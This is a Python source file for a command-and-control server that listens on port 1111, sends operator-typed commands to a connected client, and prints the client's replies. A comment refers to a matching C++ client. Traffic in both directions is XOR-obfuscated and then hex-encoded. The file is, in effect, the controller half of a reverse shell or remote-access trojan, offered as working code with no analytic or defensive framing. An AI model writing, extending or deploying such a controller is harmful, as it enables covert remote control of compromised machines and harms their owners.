import socket
import threading

KEY = 0x3A  # XOR key (must match the C++ client)


def xor(data: bytes) -> bytes:
    return bytes([b ^ KEY for b in data])


def hex_encode(data: bytes) -> str:
    return data.hex().upper()


def hex_decode(hex_str: str) -> bytes:
    return bytes.fromhex(hex_str)


def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        while True:
            cmd = input("CMD> ")
            if not cmd.strip():
                continue
            if cmd.lower() == "exit":
                encoded = hex_encode(xor(cmd.encode()))
                conn.send(encoded.encode())
                break

            encoded = hex_encode(xor(cmd.encode()))
            conn.send(encoded.encode())

            data = conn.recv(16384)
            if not data:
                print("[-] Disconnected")
                break

            decoded = xor(hex_decode(data.decode()))
            print(decoded.decode(errors='ignore'))

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()


def start_server(host='0.0.0.0', port=1111):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] Listening on {host}:{port}...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()


if __name__ == "__main__":
    start_server()
